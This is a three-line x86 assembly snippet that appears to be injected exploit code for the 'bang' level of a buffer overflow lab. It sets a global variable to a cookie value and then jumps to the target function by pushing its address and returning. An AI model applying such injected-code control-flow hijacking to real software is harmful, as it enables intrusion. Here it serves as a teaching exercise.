movl $0x2eca4965, 0x0804e140   /* set global_value as cookie */
pushl $0x08048be9      		/* push the address of bang to the stack */
ret        	      			/* goto bang */
